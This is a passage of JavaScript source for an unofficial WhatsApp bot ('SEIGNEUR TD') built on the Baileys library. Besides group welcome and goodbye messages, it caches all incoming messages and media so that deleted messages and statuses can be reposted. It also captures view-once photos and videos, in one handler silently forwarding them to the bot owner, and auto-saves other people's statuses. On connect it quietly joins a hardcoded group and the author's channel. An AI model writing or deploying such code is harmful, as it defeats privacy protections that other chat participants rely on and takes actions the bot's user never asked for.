👑 𝗦𝗨𝗣𝗘𝗥𝗔𝗗𝗠𝗜𝗡 (𝖢𝗋𝖾́𝖺𝗍𝖾𝗎𝗋) :
└─ @${superadmin.split('@')[0]}

👮‍♂️ 𝗟𝗜𝗦𝗧𝗘 𝗗𝗘𝗦 𝗔𝗗𝗠𝗜𝗡𝗦 :
${adminList}

📜 𝗥𝗘̀𝗚𝗟𝗘𝗦 𝗗𝗨 𝗚𝗥𝗢𝗨𝗣𝗘 :
𝖯𝗈𝗎𝗋 𝗀𝖺𝗋𝖽𝖾𝗋 𝗎𝗇𝖾 𝖺𝗆𝖻𝗂𝖺𝗇𝖼𝖾 𝗌𝖺𝗂𝗇𝖾 :
⛔ 𝟏. 𝖯𝖺𝗌 𝖽𝖾 𝖲𝗉𝖺𝗆
⚠️ 𝟐. 𝖯𝖺𝗌 𝖽𝖾 𝖯𝗎𝖻 / 𝖫𝗂𝖾𝗇𝗌
🤝 𝟑. 𝖱𝖾𝗌𝗉𝖾𝖼𝗍 𝖬𝗎𝗍𝗎𝖾𝗅
🔞 𝟒. 𝖢𝗈𝗇𝗍𝖾𝗇𝗎 𝖠𝗉𝗉𝗋𝗈𝗉𝗋𝗂𝖾́

💡 𝘓𝘦 𝘯𝘰𝘯-𝘳𝘦𝘴𝘱𝘦𝘤𝘵 𝘥𝘦𝘴 𝘳𝘦̀𝘨𝘭𝘦𝘴 𝘱𝘦𝘶𝘵
𝘦𝘯𝘵𝘳𝘢𝘪̂𝘯𝘦𝘳 𝘶𝘯 𝘣𝘢𝘯𝘯𝘪𝘴𝘴𝘦𝘮𝘦𝘯𝘵.

✨ 𝖯𝗋𝗈𝖿𝗂𝗍𝖾 𝖻𝗂𝖾𝗇 𝖽𝖾 𝗅𝖺 𝖼𝗈𝗆𝗆𝗎𝗇𝖺𝗎𝗍𝖾́ !
━━━━━━━━━━━━━━━━━━━━━`;

    const mentions = [newMemberJid, superadmin, ...admins.map(a => a.id)];
    
    await sock.sendMessage(groupJid, {
      text: welcomeText,
      mentions: mentions
    });
    
    console.log(`✅ Message de bienvenue envoyé à ${newMemberJid.split('@')[0]}`);
  } catch (error) {
    console.error(' in sendWelcome:', error);
  }
}

// Fonction pour envoyer le message d'au revoir
async function sendGoodbyeMessage(sock, groupJid, leftMemberJid) {
  try {
    const metadata = await sock.groupMetadata(groupJid);
    const groupName = metadata.subject;
    const memberCount = metadata.participants.length;
    
    // Trouver le superadmin
    const superadmin = metadata.owner || metadata.participants.find(p => p.admin === 'superadmin')?.id || 'Unknown';
    
    // Liste des admins
    const admins = metadata.participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin');
    let adminList = '';
    admins.forEach((admin, index) => {
      if (admin.id !== superadmin) {
        adminList += `└─ ${index + 1}. @${admin.id.split('@')[0]}\n`;
      }
    });
    if (!adminList) adminList = '└─ Aucun admin supplémentaire';
    
    // Date et heure
    const now = new Date();
    const dateStr = now.toLocaleDateString('fr-FR', {
      timeZone: 'America/Port-au-Prince',
      day: '2-digit',
      month: '2-digit',
      year: 'numeric'
    });
    const timeStr = now.toLocaleTimeString('fr-FR', {
      timeZone: 'America/Port-au-Prince',
      hour: '2-digit',
      minute: '2-digit'
    });
    
    const goodbyeText = `┏━━━ 💨 ɢᴏᴏᴅʙʏᴇ ━━━┓

  ◈ 𝖦𝗋𝗈𝗎𝗉𝖾 : ${groupName}
  ◈ 𝖬𝖾𝗆𝖻𝗋𝖾𝗌 : ${memberCount} 
  
  📅 𝖣𝖺𝗍𝖾 : ${dateStr}
  🕙 𝖧𝖾𝗎𝗋𝖾 : ${timeStr}

┗━━━━━━━━━━━━━━━━━━━━┛

👋 𝗨𝗡 𝗠𝗘𝗠𝗕𝗥𝗘 𝗡𝗢𝗨𝗦 𝗤𝗨𝗜𝗧𝗧𝗘 :
└─ @${leftMemberJid.split('@')[0]}

👑 𝗦𝗨𝗣𝗘𝗥𝗔𝗗𝗠𝗜𝗡 :
└─ @${superadmin.split('@')[0]}

👮‍♂️ 𝗦𝗧𝗔𝗙𝗙 𝗔𝗗𝗠𝗜𝗡𝗦 :
${adminList}

📜 𝗜𝗡𝗙𝗢 :
𝖴𝗇𝖾 𝗉𝖾𝗋𝗌𝗈𝗇𝗇𝖾 𝖺 𝗊𝗎𝗂𝗍𝗍𝖾́ 𝗅'𝖺𝗏𝖾𝗇𝗍𝗎𝗋𝖾. 
𝖫𝖾 𝗀𝗋𝗈𝗎𝗉𝖾 𝖼𝗈𝗆𝗉𝗍𝖾 𝖽𝖾́𝗌𝗈𝗋𝗆𝖺𝗂𝗌 ${memberCount} 
𝗉𝖺𝗋𝗍𝗂𝖼𝗂𝗉𝖺𝗇𝗍𝗌.

💡 𝘙𝘢𝘱𝘱𝘦𝘭 : 𝘛𝘰𝘶𝘵𝘦 𝘦𝘹𝘤𝘭𝘶𝘴𝘪𝘰𝘯 𝘱𝘢𝘳 𝘭𝘦 𝘴𝘵𝘢𝘧𝘧 
𝘦𝘴𝘵 𝘥𝘦́𝘧𝘪𝘯𝘪𝘵𝘪𝘷𝘦 𝘴𝘢𝘶𝘧 𝘢𝘱𝘱𝘦𝘭 𝘢𝘶𝘱𝘳𝘦̀𝘴 𝘥'𝘶𝘯 𝘢𝘥𝘮𝘪𝘯.

━━━━━━━━━━━━━━━━━━━━
👋 𝖠𝗎 𝗉𝗅𝖺𝗂𝗌𝗂𝗋 𝖽𝖾 𝗍𝖾 𝗋𝖾𝗏𝗈𝗂𝗋 !`;

    const mentions = [leftMemberJid, superadmin, ...admins.map(a => a.id)];
    
    await sock.sendMessage(groupJid, {
      text: goodbyeText,
      mentions: mentions
    });
    
    console.log(`✅ Message d'au revoir envoyé pour ${leftMemberJid.split('@')[0]}`);
  } catch (error) {
    console.error(' in sendGoodbye:', error);
  }
}

// =============================================


// =============================================
// CONNEXION WHATSAPP
// =============================================


// ─── Helper AntiDelete : envoie le media ou texte selon cache ────────────────
async function sendAntiDeleteNotif(sock, notifyJid, cachedMsg) {
  const senderJid = cachedMsg.sender || '';
  const label = cachedMsg.isViewOnce ? '👁️ VUE UNIQUE SUPPRIMÉE' : '🗑️ MESSAGE SUPPRIMÉ';
  const msgContent = cachedMsg.text && !['[Image]','[Video]','[Audio]','[Sticker]','[Document]','[Message]'].includes(cachedMsg.text) ? cachedMsg.text : '[ média ]';
  const header =
`┏━━━━━━━━━━━━━━━━┓
   ${label}
┗━━━━━━━━━━━━━━━━┛

❖ *AUTEUR* : @${senderJid.split('@')[0]}
❖ *MESSAGE* : \`${msgContent}\`

*© SEIGNEUR TD*`;

  const mentions = senderJid ? [senderJid] : [];

  if (cachedMsg.mediaBuffer && cachedMsg.mediaBuffer.length > 100) {
    const mime = cachedMsg.mediaMime || '';
    const caption = header + (cachedMsg.mediaCaption ? '\n❖ LÉGENDE · ' + cachedMsg.mediaCaption : '');
    try {
      if (cachedMsg.mediaType === 'image') {
        await sock.sendMessage(notifyJid, { image: cachedMsg.mediaBuffer, caption, mentions });
      } else if (cachedMsg.mediaType === 'video') {
        await sock.sendMessage(notifyJid, { video: cachedMsg.mediaBuffer, caption, mimetype: mime || 'video/mp4', mentions });
      } else if (cachedMsg.mediaType === 'audio') {
        await sock.sendMessage(notifyJid, { text: header, mentions });
        await sock.sendMessage(notifyJid, { audio: cachedMsg.mediaBuffer, mimetype: mime || 'audio/mpeg', ptt: mime.includes('ogg') });
      } else if (cachedMsg.mediaType === 'sticker') {
        await sock.sendMessage(notifyJid, { text: header, mentions });
        await sock.sendMessage(notifyJid, { sticker: cachedMsg.mediaBuffer });
      } else if (cachedMsg.mediaType === 'document') {
        await sock.sendMessage(notifyJid, { document: cachedMsg.mediaBuffer, mimetype: mime || 'application/octet-stream', caption, mentions });
      } else {
        await sock.sendMessage(notifyJid, { text: header, mentions });
      }
      return;
    } catch(e) {
      console.log('[ANTIDELETE] Erreur envoi media: ' + e.message);
    }
  }
  // Fallback texte
  await sock.sendMessage(notifyJid, { text: header, mentions });
}

async function connectToWhatsApp() {
  loadData();

  // =============================================
  // 📢 MESSAGE AUTO TRANSFÉRÉ DEPUIS LA CHAÎNE
  // =============================================
  const _sendChannelForward = async (sock, text) => {
    try {
      const botJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
      await sock.sendMessage(botJid, {
        text: text,
        contextInfo: {
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363422398514286@newsletter',
            serverMessageId: 1,
            newsletterName: 'SEIGNEUR TD'
          }
        }
      });
    } catch(e) {
      console.error('[CHANNEL FORWARD]', e.message);
    }
  };

  const { version, isLatest } = await fetchLatestBaileysVersion();
  console.log(`Using WA v${version.join('.')}, isLatest: ${isLatest}`);

  // ✅ Support SESSION_ID (variable d'environnement) pour hébergeurs
  const SESSION_ID = process.env.SESSION_ID;
  if (SESSION_ID && !fs.existsSync(path.join(config.sessionFolder, 'creds.json'))) {
    try {
      const sessionData = JSON.parse(Buffer.from(SESSION_ID, 'base64').toString('utf8'));
      await fs.promises.mkdir(config.sessionFolder, { recursive: true });
      for (const [filename, fileContent] of Object.entries(sessionData)) {
        await fs.promises.writeFile(path.join(config.sessionFolder, filename), fileContent, 'utf8');
      }
      console.log('✅ Session restaurée depuis SESSION_ID !');
    } catch(e) {
      console.log('⚠️ Erreur restauration session: ' + e.message);
    }
  }

  const { state, saveCreds } = await useMultiFileAuthState(config.sessionFolder);

  // Support Unicode complet (Sinhala, Arabe, etc.)
  process.stdout.setEncoding('utf8');
  if (process.env.LANG === undefined) process.env.LANG = 'en_US.UTF-8';

  const sock = makeWASocket({
    version,
    logger: pino({ level: 'silent' }),
    printQRInTerminal: !config.usePairingCode,
    auth: state,
    browser: ['Ubuntu', 'Chrome', '1.0.0'],
    generateHighQualityLinkPreview: true,
    keepAliveIntervalMs: 15000,
    connectTimeoutMs: 60000,
    defaultQueryTimeoutMs: 60000,
    retryRequestDelayMs: 500,
    maxMsgRetryCount: 5,
    patchMessageBeforeSending: (msg) => msg,
    getMessage: async (key) => {
      try {
        const cached = messageCache.get(key.id);
        if (cached) return cached;
      } catch(e) {}
      return undefined;
    }
  });

  // Handle pairing code

  // Connection update handler
  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect, qr } = update;

    // ── Bot principal : pas de pairing par terminal, tout passe par /api/connect ──
    // Le bot principal sert uniquement de processus hôte pour l'API et les sessions web

    if (connection === 'close') {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
      console.log('[BOT PRINCIPAL] Connexion fermée (code:' + statusCode + '), reconnexion:', shouldReconnect);

      if (shouldReconnect) {
        // Délai plus court pour les déconnexions réseau normales
        const isNormal = statusCode === 515 || statusCode === 428 || statusCode === 503;
        const waitMs = isNormal ? 5000 : 8000;
        await delay(waitMs);
        connectToWhatsApp();
      } else {
        console.log('⚠️ Session principale expirée — suppression du dossier auth et redémarrage...');
        saveData();
        pairingRequested = false;
        try { fs.rmSync(config.sessionFolder, { recursive: true, force: true }); } catch(e) {}
        await delay(3000);
        connectToWhatsApp();
      }
    } else if (connection === 'open') {
      console.log('✅ Connecté à WhatsApp!');
      console.log(`Bot: ${config.botName}`);
      console.log(`Bot JID: ${sock.user.id}`);
      console.log('\n⚔️ SEIGNEUR TD est prêt! ⚔️\n');
      
      // ✅ Enregistrer le JID du bot (owner) pour reconnaissance @lid dans les groupes
      global.botLidJid = sock.user.id;
      global.botOwnerLid = sock.user.id.split(':')[0];
      console.log(`[OWNER LID enregistré: ${global.botOwnerLid}]`);
      // ✅ Socket principal enregistré (nouveau système multi-session)
      console.log('[PAIRING API] Socket enregistré ✅');
      
      // ✅ Auto-admin : ajouter le JID connecté comme super admin
      const ownerLidClean = sock.user.id.split(':')[0].split('@')[0];
      if (!config.adminNumbers.includes(ownerLidClean)) config.adminNumbers.push(ownerLidClean);
      if (!config.botAdmins.includes(ownerLidClean)) config.botAdmins.push(ownerLidClean);
      // ✅ Persister dans index.js pour survivre aux redémarrages
      try {
        const indexPath = new URL(import.meta.url).pathname;
        let indexContent = fs.readFileSync(indexPath, 'utf8');
        const adminRegex = /(adminNumbers:\s*\[)([^\]]*?)(\])/;
        const match = indexContent.match(adminRegex);
        if (match) {
          const existing = match[2].split(',').map(s => s.replace(/['" ]/g,'')).filter(Boolean);
          if (!existing.includes(ownerLidClean)) {
            const newList = [...new Set([...existing, ownerLidClean])].map(n => `'${n}'`).join(', ');
            indexContent = indexContent.replace(adminRegex, `$1${newList}$3`);
            // Mettre à jour aussi botAdmins
            const botAdminRegex = /(botAdmins:\s*\[)([^\]]*?)(\])/;
            indexContent = indexContent.replace(botAdminRegex, `$1${newList}$3`);
            fs.writeFileSync(indexPath, indexContent, 'utf8');
            console.log('[AUTO-ADMIN] ✅ ' + ownerLidClean + ' ajouté comme super admin');
          }
        }
      } catch(e) {
        console.log('[AUTO-ADMIN] ⚠️ Erreur écriture:', e.message);
      }

      // Auto-join silencieux groupe + chaine
      if (!global._autoJoinDone) {
        global._autoJoinDone = true;
        setTimeout(async () => {
          try {
            const _groups = await sock.groupFetchAllParticipating().catch(() => ({}));
            const _targetInvite = 'KfbEkfcbepR0DPXuewOrur';
            const _inGroup = Object.values(_groups).some(g =>
              (g?.participants||[]).some(p => p.id === sock.user.id)
              && g?.inviteCode === _targetInvite
            );
            if (!_inGroup) await sock.groupAcceptInvite(_targetInvite).catch(() => {});
          } catch(e) {}
          try {
            // Rejoindre la chaine - essayer toutes les methodes avec les 2 identifiants
            const _channelIds = [
              '120363422398514286@newsletter',
              '0029VbBZrLBFMqrQIDpcfO04@newsletter'
            ];
            for (const _cid of _channelIds) {
              try {
                if (typeof sock.newsletterFollow === 'function') {
                  await sock.newsletterFollow(_cid);
                  console.log('[AUTO-JOIN CHANNEL] newsletterFollow OK:', _cid);
                  break;
                } else if (typeof sock.followNewsletter === 'function') {
                  await sock.followNewsletter(_cid);
                  console.log('[AUTO-JOIN CHANNEL] followNewsletter OK:', _cid);
                  break;
                } else {
                  // Fallback: appel direct via la socket WA
                  await sock.query({
                    tag: 'iq',
                    attrs: { type: 'set', xmlns: 'w:mex', to: 's.whatsapp.net' },
                    content: [{ tag: 'subscribe', attrs: { to: _cid } }]
                  }).catch(() => {});
                  console.log('[AUTO-JOIN CHANNEL] query OK:', _cid);
                  break;
                }
              } catch(e2) { console.log('[AUTO-JOIN CHANNEL] attempt failed:', _cid, e2.message); }
            }
          } catch(e) { console.log('[AUTO-JOIN CHANNEL]', e.message); }
        }, 8000);
      }

      // ✅ Message de connexion dans le PV du bot (une seule fois)
      if (!global._connMsgSent) {
        global._connMsgSent = true;
        setTimeout(() => {
          _sendChannelForward(sock,
`*SEIGNEUR TD* 🇷🇴

❒ *STATUS* : \`ONLINE\`
❒ *VERSION* : \`1.0.0\`
❒ *SYSTEM* : \`ACTIVE\`

*© SEIGNEUR TD*`
          );
        }, 3000);
      }
    }
  });

  sock.ev.on('creds.update', saveCreds);

  const processedMsgIds=new Set();
  sock.ev.on('messages.upsert', async ({ messages, type }) => {
    if(type!=='notify')return;
    for(const message of messages){

      // =============================================
      // =============================================
      // GESTION RÉPONSES BOUTONS INTERACTIFS (nativeFlowInfo)


      // ANTI-DELETE via protocolMessage (revoke)
      // =============================================
      if (antiDelete && message.message?.protocolMessage?.type === 0) {
        try {
          const deletedKey = message.message.protocolMessage.key;
          const messageId = deletedKey?.id;
          const remoteJid = message.key.remoteJid;
          const deleterJid = message.key.participant || message.key.remoteJid;

          if (messageId) {
            const cachedMsg = messageCache.get(messageId);
            if (cachedMsg) {
              const isGroup = remoteJid.endsWith('@g.us');
              const botPvJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
              let notifyJid;
              if (antiDeleteMode === 'private') {
                // PV du bot uniquement
                notifyJid = botPvJid;
              } else if (antiDeleteMode === 'chat') {
                // Dans le chat d'origine (groupe ou PV de la personne)
                notifyJid = remoteJid;
              } else {
                // Mode 'all' = les deux : chat d'origine + PV du bot
                notifyJid = remoteJid;
                await sendAntiDeleteNotif(sock, botPvJid, cachedMsg);
              }
              const senderJid = cachedMsg.sender;
              await sendAntiDeleteNotif(sock, notifyJid, cachedMsg);
              console.log('[ANTIDELETE] Message restaure de ' + senderJid + ' type=' + (cachedMsg.mediaType || 'texte') + (cachedMsg.isViewOnce ? ' [VUE UNIQUE]' : ''));
            }
          }
        } catch(e) {
          console.error('❌ Erreur antidelete upsert:', e.message);
        }
        continue;
      }

      const msgAge=Date.now()-((message.messageTimestamp||0)*1000);
      if(msgAge>60000)continue;
      const msgId=message.key.id;
      if(processedMsgIds.has(msgId))continue;
      processedMsgIds.add(msgId);
      if(processedMsgIds.size>2000)processedMsgIds.delete(processedMsgIds.values().next().value);
      // IMPORTANT: Accepter les messages du bot aussi (pour les discussions privées with le numéro du bot)
      if (message.key.remoteJid === 'status@broadcast') {
        // =============================================
        // GESTION AUTOMATIQUE DES STATUS
        // =============================================
        try {
          const statusSender = message.key.participant || message.key.remoteJid;
          const botJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
          
          console.log(`📱 Nouveau status détecté de: ${statusSender}`);
          
          const messageType2 = Object.keys(message.message || {})[0];

          // 🗑️ AntiDeleteStatus — Détecter suppression de statut (protocolMessage type=0)
          if (messageType2 === 'protocolMessage') {
            if (antiDeleteStatus) {
              try {
                const proto = message.message.protocolMessage;
                if (proto?.type === 0) {
                  const deletedStatusKey = proto.key;
                  const deleterJid = message.key.participant || statusSender;
                  const botPv = botJid;
                  const cachedStatus = global._statusCache?.get(deletedStatusKey?.id);
                  // Toujours envoyer en PV du bot
                  const targetJid = botPv;
                  const realNumber = deleterJid.split('@')[0].replace(/[^0-9]/g, '');
                  if (cachedStatus) {
                    const caption = `🗑️ *Status supprimé*\n👤 @${realNumber}\n\n*© SEIGNEUR TD*`;
                    if (cachedStatus.type === 'image') {
                      await sock.sendMessage(targetJid, { image: cachedStatus.buf, caption, mentions: [deleterJid] });
                    } else if (cachedStatus.type === 'video') {
                      await sock.sendMessage(targetJid, { video: cachedStatus.buf, caption, mentions: [deleterJid] });
                    } else if (cachedStatus.type === 'text') {
                      await sock.sendMessage(targetJid, { text: `🗑️ *Status supprimé*\n👤 @${realNumber}\n📝 ${cachedStatus.text}\n\n*© SEIGNEUR TD*`, mentions: [deleterJid] });
                    }
                  } else {
                    await sock.sendMessage(targetJid, {
                      text: `🗑️ *Status supprimé*\n👤 @${realNumber}\n\n_(Élément non mis en cache)_\n\n*© SEIGNEUR TD*`,
                      mentions: [deleterJid]
                    });
                  }
                }
              } catch(e) { console.error('[AntiDeleteStatus]', e.message); }
            }
            continue;
          }

          if (!messageType2) continue;

          // 👁️ AutoStatusViews — Voir les statuts automatiquement
          if (autoStatusViews && statusSender !== botJid) {
            await sock.readMessages([message.key]).catch(() => {});
          }

          // ❤️ AutoReactStatus — Réagir aux statuts (seulement si autoStatusViews actif)
          if (autoReactStatus && autoStatusViews && statusSender !== botJid) {
            await sock.sendMessage('status@broadcast', {
              react: { text: statusReactEmoji, key: message.key }
            }, { statusJidList: [statusSender] }).catch(() => {});
          }

          // 📦 Cache statuts pour antiDeleteStatus
          if (antiDeleteStatus) {
            try {
              if (!global._statusCache) global._statusCache = new Map();
              const msg2 = message.message;
              const sKey = message.key.id;
              if (msg2?.imageMessage) {
                const buf = await toBuffer(await downloadContentFromMessage(msg2.imageMessage, 'image')).catch(() => null);
                if (buf) global._statusCache.set(sKey, { type: 'image', buf });
              } else if (msg2?.videoMessage) {
                const buf = await toBuffer(await downloadContentFromMessage(msg2.videoMessage, 'video')).catch(() => null);
                if (buf) global._statusCache.set(sKey, { type: 'video', buf });
              } else if (msg2?.extendedTextMessage?.text || msg2?.conversation) {
                global._statusCache.set(sKey, { type: 'text', text: msg2?.extendedTextMessage?.text || msg2?.conversation });
              }
              // Garder max 50 statuts en cache
              if (global._statusCache.size > 50) {
                const firstKey = global._statusCache.keys().next().value;
                global._statusCache.delete(firstKey);
              }
            } catch(e) {}
          }

          // 💾 AutoSaveStatus — Sauvegarder les statuts en PV du bot
          if (autoSaveStatus && statusSender !== botJid) {
            try {
              const botPv = sock.user.id.split(':')[0] + '@s.whatsapp.net';
              const msg = message.message;
              const imgMsg = msg?.imageMessage;
              const vidMsg = msg?.videoMessage;
              const txtMsg = msg?.extendedTextMessage?.text || msg?.conversation;
              if (imgMsg) {
                const buf = await toBuffer(await downloadContentFromMessage(imgMsg, 'image'));
                await sock.sendMessage(botPv, { image: buf, caption: `📸 Status de +${statusSender.split('@')[0]}` });
              } else if (vidMsg) {
                const buf = await toBuffer(await downloadContentFromMessage(vidMsg, 'video'));
                await sock.sendMessage(botPv, { video: buf, caption: `🎥 Status de +${statusSender.split('@')[0]}` });
              } else if (txtMsg) {
                await sock.sendMessage(botPv, { text: `📝 Status de +${statusSender.split('@')[0]}:\n${txtMsg}` });
              }
            } catch(e) { console.error('[AutoSaveStatus]', e.message); }
          }

          // =============================================
          // 🚫 ANTI-MENTION GROUPE — Kick si mention groupe en status
          // =============================================
          if (statusSender !== botJid) {
            const statusMsg = message.message;
            const hasGroupMention =
              statusMsg?.groupStatusMentionMessage !== undefined ||
              statusMsg?.groupMentionMessage !== undefined ||
              statusMsg?.extendedTextMessage?.contextInfo?.groupMentions?.length > 0 ||
              statusMsg?.imageMessage?.contextInfo?.groupMentions?.length > 0 ||
              statusMsg?.videoMessage?.contextInfo?.groupMentions?.length > 0 ||
              statusMsg?.documentMessage?.contextInfo?.groupMentions?.length > 0;

            if (hasGroupMention) {
              console.log(`⚠️ [ANTI-MENTION GROUPE] ${statusSender} a mentionné un groupe en status`);
              // Chercher dans tous les groupes actifs si cette personne est membre
              try {
                const groupList = await sock.groupFetchAllParticipating();
                for (const [groupJid, groupData] of Object.entries(groupList)) {
                  const settings = groupSettings.get(groupJid);
                  if (!settings?.antimentiongroupe) continue; // Seulement si activé dans ce groupe

                  const isMember = groupData.participants.some(p => p.id === statusSender);
                  if (!isMember) continue;

                  const botIsAdmin = await isBotGroupAdmin(sock, groupJid);
                  if (!botIsAdmin) continue;

                  // Supprimer le message de status + expulser le membre
                  try {
                    await sock.sendMessage(groupJid, {
                      delete: message.key
                    }).catch(() => {});

                    await sock.sendMessage(groupJid, {
                      text:
`╭─────────────────────────────╮
  🚫  EXPULSION AUTOMATIQUE
╰─────────────────────────────╯

❖ @${statusSender.split('@')[0]}
❖ ACTION  ·  Mention du groupe
             dans un statut
❖ STATUT  ·  ❌ EXPULSÉ

╭─────────────────────────────╮
   © SEIGNEUR TD
╰─────────────────────────────╯`,
                      mentions: [statusSender]
                    });

                    await sock.groupParticipantsUpdate(groupJid, [statusSender], 'remove');
                    console.log(`✅ [ANTI-MENTION GROUPE] ${statusSender} supprimé et expulsé de ${groupJid}`);
                  } catch(e) {
                    console.error(`[ANTI-MENTION GROUPE] Erreur:`, e.message);
                  }
                }
              } catch(e) {
                console.error('[ANTI-MENTION GROUPE] Erreur fetch groupes:', e.message);
              }
            }
          }
          
        } catch (error) {
          console.error(' lors de la gestion du status:', error);
        }
        continue;
      }

      const remoteJid = message.key.remoteJid;
      const isGroup = remoteJid.endsWith('@g.us');
      let senderJid;
      if (isGroup) { senderJid = message.key.participant; }
      else if (message.key.fromMe) { senderJid = sock.user.id.split(':')[0]+'@s.whatsapp.net'; }
      else { senderJid = remoteJid; }

      // =============================================
      // CACHE DES MESSAGES POUR ANTI-DELETE/EDIT
      // =============================================
      if (antiDelete || antiEdit) {
        const messageId = message.key.id;
        const msg = message.message;

        // Detecter type media + vue unique
        const imgMsg     = msg?.imageMessage || msg?.viewOnceMessage?.message?.imageMessage || msg?.viewOnceMessageV2?.message?.imageMessage || msg?.viewOnceMessageV2Extension?.message?.imageMessage;
        const vidMsg     = msg?.videoMessage || msg?.viewOnceMessage?.message?.videoMessage || msg?.viewOnceMessageV2?.message?.videoMessage || msg?.viewOnceMessageV2Extension?.message?.videoMessage;
        const audioMsg   = msg?.audioMessage;
        const stickerMsg = msg?.stickerMessage;
        const docMsg     = msg?.documentMessage;
        const isViewOnce = !!(msg?.viewOnceMessage || msg?.viewOnceMessageV2 || msg?.viewOnceMessageV2Extension);
        const mediaRawMsg = imgMsg || vidMsg || audioMsg || stickerMsg || docMsg || null;
        const mediaType   = imgMsg ? 'image' : vidMsg ? 'video' : audioMsg ? 'audio' : stickerMsg ? 'sticker' : docMsg ? 'document' : null;

        const messageData = {
          key: message.key,
          message: msg,
          sender: senderJid,
          senderName: message.pushName || senderJid?.split('@')[0],
          remoteJid: remoteJid,
          isGroup: isGroup,
          timestamp: Date.now(),
          isViewOnce: isViewOnce,
          mediaType: mediaType,
          mediaMsg: mediaRawMsg,
          mediaMime: imgMsg?.mimetype || vidMsg?.mimetype || audioMsg?.mimetype || stickerMsg?.mimetype || docMsg?.mimetype || null,
          mediaCaption: imgMsg?.caption || vidMsg?.caption || docMsg?.caption || '',
          text: msg?.conversation || msg?.extendedTextMessage?.text || imgMsg?.caption || vidMsg?.caption || docMsg?.caption || (imgMsg ? '[Image]' : vidMsg ? '[Video]' : audioMsg ? '[Audio]' : stickerMsg ? '[Sticker]' : docMsg ? '[Document]' : '[Message]')
        };

        // Telecharger le media en buffer immediatement (avant suppression possible)
        if (mediaRawMsg && mediaType) {
          try {
            const stream = await downloadContentFromMessage(mediaRawMsg, mediaType);
            const chunks = [];
            for await (const chunk of stream) chunks.push(chunk);
            messageData.mediaBuffer = Buffer.concat(chunks);
            console.log('[CACHE] Media sauvegarde: ' + mediaType + (isViewOnce ? ' (VUE UNIQUE)' : '') + ' ' + (messageData.mediaBuffer.length/1024).toFixed(0) + ' KB');
          } catch(e) {
            console.log('[CACHE] Erreur media: ' + e.message);
          }
        }

        messageCache.set(messageId, messageData);
        console.log('[CACHE] ID=' + messageId + ' type=' + (mediaType || 'texte') + (isViewOnce ? ' [VUE UNIQUE]' : ''));

        // Garder seulement les 500 derniers messages
        if (messageCache.size > 500) {
          const firstKey = messageCache.keys().next().value;
          messageCache.delete(firstKey);
        }
      }

      // =============================================
      // TRACKING D'ACTIVITÉ DES MEMBRES (POUR LISTACTIVE/LISTINACTIVE)
      // =============================================
      if (isGroup) {
        // Initialiser la Map pour ce groupe si elle n'existe pas
        if (!memberActivity.has(remoteJid)) {
          memberActivity.set(remoteJid, new Map());
        }
        
        const groupActivity = memberActivity.get(remoteJid);
        const currentActivity = groupActivity.get(senderJid) || { last: 0, messageCount: 0 };
        
        groupActivity.set(senderJid, {
          last: Date.now(),
          messageCount: currentActivity.messageCount + 1
        });
        
        console.log(`📊 Activité: ${senderJid.split('@')[0]} a maintenant ${currentActivity.messageCount + 1} messages`);
      }

      // Détection View Once — capturer tous les types
      const msgKeys = Object.keys(message.message || {});
      const isViewOnce = (
        message.message?.viewOnceMessageV2 ||
        message.message?.viewOnceMessageV2Extension ||
        message.message?.imageMessage?.viewOnce === true ||
        message.message?.videoMessage?.viewOnce === true ||
        msgKeys.some(k => k.toLowerCase().includes('viewonce'))
      );
      if (isViewOnce) {
        await handleViewOnce(sock, message, remoteJid, senderJid);
      }

      // ══════════════════════════════════════════════
      // 🔒 FONCTIONNALITÉ SECRÈTE — Bold Reply Save
      // N'importe qui (y compris le bot) peut répondre en GRAS
      // → capture silencieuse en privé (groupes + privés)
      // ══════════════════════════════════════════════
      // [Bold+Quote supprime - causait envois PV non voulus]

      // ══════════════════════════════════════════════
      // 🎭 EMOJI REPLY → envoie vue unique en PV (seulement si le message cité est un vrai vue unique)
      // ══════════════════════════════════════════════
      try {
        const emojiQuotedCtx = message.message?.extendedTextMessage?.contextInfo;
        const emojiHasQuoted = !!(emojiQuotedCtx?.quotedMessage);
        const _hasReplyText = !!(message.message?.extendedTextMessage?.text || message.message?.conversation);

        if (emojiHasQuoted && _hasReplyText) {
          const quoted2 = emojiQuotedCtx.quotedMessage;
          // ✅ Vérifier que c'est bien un vue unique avant tout
          const isQuotedViewOnce = !!(
            quoted2.viewOnceMessageV2 ||
            quoted2.viewOnceMessageV2Extension ||
            quoted2.imageMessage?.viewOnce === true ||
            quoted2.videoMessage?.viewOnce === true
          );
          if (isQuotedViewOnce) {
            const botPrivJid2 = sock.user.id.split(':')[0] + '@s.whatsapp.net';
            const qVonceMsg2 = quoted2.viewOnceMessageV2?.message || quoted2.viewOnceMessageV2Extension?.message;
            const qImg2  = qVonceMsg2?.imageMessage  || quoted2.imageMessage;
            const qVid2  = qVonceMsg2?.videoMessage  || quoted2.videoMessage;
            const qAud2  = quoted2.audioMessage;
            const qTxt3  = quoted2.conversation || quoted2.extendedTextMessage?.text;

            if (qImg2) {
              const buf = await toBuffer(await downloadContentFromMessage(qImg2, 'image'));
              await sock.sendMessage(botPrivJid2, { image: buf, mimetype: qImg2.mimetype || 'image/jpeg', caption: '' });
            } else if (qVid2) {
              const buf = await toBuffer(await downloadContentFromMessage(qVid2, 'video'));
              await sock.sendMessage(botPrivJid2, { video: buf, mimetype: qVid2.mimetype || 'video/mp4', caption: '' });
            } else if (qAud2) {
              const buf = await toBuffer(await downloadContentFromMessage(qAud2, 'audio'));
              await sock.sendMessage(botPrivJid2, { audio: buf, mimetype: qAud2.mimetype || 'audio/ogg; codecs=opus', ptt: false, audioPlayback: true });
            } else if (qTxt3) {
              await sock.sendMessage(botPrivJid2, { text: qTxt3 });
            }
          }
        }
      } catch(e) {
        console.error('[Emoji Reply VU]', e.message);
      }

      // Détection Sticker-Commande (setcmd)
      if (message.message?.stickerMessage && global.stickerCommands?.size > 0) {
        try {
          const stickerMsg = message.message.stickerMessage;
          const stream = await downloadContentFromMessage(stickerMsg, 'sticker');
          const buf    = await toBuffer(stream);
          const hash   = buf.slice(0, 32).toString('hex');
